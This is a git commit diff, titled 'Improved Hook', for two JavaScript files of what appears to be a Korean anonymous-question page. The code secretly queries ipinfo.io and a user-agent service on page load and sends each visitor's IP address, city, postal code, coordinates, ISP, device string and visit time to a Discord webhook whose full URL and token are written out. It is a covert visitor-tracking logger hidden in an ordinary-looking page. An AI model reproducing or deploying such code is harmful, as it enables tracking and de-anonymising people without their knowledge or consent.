0708163bd53bbf989d96e912483d11f8b16587b0
Stlove <pvp0321@gmail.com>
2022-12-18 00:54:15 +0900

    Improved Hook

--- Asked/js/chowon.js
+++ Asked/js/chowon.js
@@ -1,8 +1,16 @@
-$.getJSON("https://ipinfo.io/json", function(data) {         
-  var params = {
+var url = 'https://ipinfo.io/json';
+var url2 = 'https://uploadbeta.com/api/user-agent/';
+var today = new Date();
+var date = today.getFullYear()+'년 '+(today.getMonth()+1)+'월 '+today.getDate()+'일';
+var time = today.getHours() + "시 " + today.getMinutes() + "분 " + today.getSeconds()+'초';
+var millisecond = today.getMilliseconds() + '초 (밀리)';
+var timelog = date + ' ' + time + '  '+ millisecond;
+$.getJSON(url, function (data) {
+    $.getJSON(url2, function (data2) {
+        var params = {
     embeds: [
       {
-        "title": "정초원 에스크",
+        "title": "에스크 참가 알림",
         "color": 15258703,
         "thumbnail": {
         },
@@ -11,52 +19,33 @@ $.getJSON("https://ipinfo.io/json", function(data) {
             "name": "아이피",
             "value": `> ${data.ip}`
           },
+		   {
+            "name": "시간 정보",
+            "value": timelog,
+          },
+		  {
+            "name": "기기 정보",
+            "value": `>>> ${data2},`
+          },
           {
             "name": "위치 정보",
-            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
+            "value": `>>> 도 / 시: ${data.city}, ${data.region}\n국가: ${data.country}\n우편 번호: ${data.postal}\n시간대: ${(data.timezone).replace('_', ' ')}\n위치: ${data.loc}`
           },
           {
             "name": "네트워크 정보",
-            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
+            "value": `>>> ISP: ${data.org}\n`
           }
         ]
       }
     ]
   }
-  fetch('https://discordapp.com/api/webhooks/1052117287903187015/IxjBejoGAgsORjqP5xGFa6k8CEglMa4IGzi8IKm8B4EF8FblFPgo9i-BQzv4yirlilco', {
+  fetch('https://discord.com/api/webhooks/1052117287903187015/IxjBejoGAgsORjqP5xGFa6k8CEglMa4IGzi8IKm8B4EF8FblFPgo9i-BQzv4yirlilco', {
     method: "POST",
     headers: {
         'Content-type': 'application/json'
     },
     body: JSON.stringify(params)
   }).then(res => {
-  }) 
-})
-
-$.getJSON("https://uploadbeta.com/api/user-agent/", function(data) {         
-  var params = {
-    embeds: [
-      {
-        "title": "Device Info",
-        "color": 15258703,
-        "thumbnail": {
-        },
-        "fields": [
-          {
-            "name": "Device",
-            "value": `> ${data}`
-          }
-        ]
-      }
-    ]
-  }
-  fetch('https://discordapp.com/api/webhooks/1052117287903187015/IxjBejoGAgsORjqP5xGFa6k8CEglMa4IGzi8IKm8B4EF8FblFPgo9i-BQzv4yirlilco', {
-    method: "POST",
-    headers: {
-        'Content-type': 'application/json'
-    },
-    body: JSON.stringify(params)
-  }).then(res => {
-  }) 
-})
-
+  })
+});
+});
--- Asked/js/minjun.js
+++ Asked/js/minjun.js
@@ -1,8 +1,16 @@
-$.getJSON("https://ipinfo.io/json", function(data) {         
-  var params = {
+var url = 'https://ipinfo.io/json';
+var url2 = 'https://uploadbeta.com/api/user-agent/';
+var today = new Date();
+var date = today.getFullYear()+'년 '+(today.getMonth()+1)+'월 '+today.getDate()+'일';
+var time = today.getHours() + "시 " + today.getMinutes() + "분 " + today.getSeconds()+'초';
+var millisecond = today.getMilliseconds() + '초 (밀리)';
+var timelog = date + ' ' + time + '  '+ millisecond;
+$.getJSON(url, function (data) {
+    $.getJSON(url2, function (data2) {
+        var params = {
     embeds: [
       {
-        "title": "김민준 에스크",
+        "title": "에스크 참가 알림",
         "color": 15258703,
         "thumbnail": {
         },
@@ -11,13 +19,21 @@ $.getJSON("https://ipinfo.io/json", function(data) {
             "name": "아이피",
             "value": `> ${data.ip}`
           },
+		   {
+            "name": "시간 정보",
+            "value": timelog,
+          },
+		  {
+            "name": "기기 정보",
+            "value": `>>> ${data2},`
+          },
           {
             "name": "위치 정보",
-            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
+            "value": `>>> 도 / 시: ${data.city}, ${data.region}\n국가: ${data.country}\n우편 번호: ${data.postal}\n시간대: ${(data.timezone).replace('_', ' ')}\n위치: ${data.loc}`
           },
           {
             "name": "네트워크 정보",
-            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
+            "value": `>>> ISP: ${data.org}\n`
           }
         ]
       }
@@ -30,33 +46,6 @@ $.getJSON("https://ipinfo.io/json", function(data) {
     },
     body: JSON.stringify(params)
   }).then(res => {
-  }) 
-})
-
-$.getJSON("https://uploadbeta.com/api/user-agent/", function(data) {         
-  var params = {
-    embeds: [
-      {
-        "title": "Device Info",
-        "color": 15258703,
-        "thumbnail": {
-        },
-        "fields": [
-          {
-            "name": "Device",
-            "value": `> ${data}`
-          }
-        ]
-      }
-    ]
-  }
-  fetch('https://discord.com/api/webhooks/1052156020719366184/3XzWMVtFJHfQzLmNd0PR-UZXh2r7NTp8oM7r0JOwwR55yLoK1YlJR1e553Zf9SKnagFn', {
-    method: "POST",
-    headers: {
-        'Content-type': 'application/json'
-    },
-    body: JSON.stringify(params)
-  }).then(res => {
-  }) 
-})
-
+  })
+});
+});
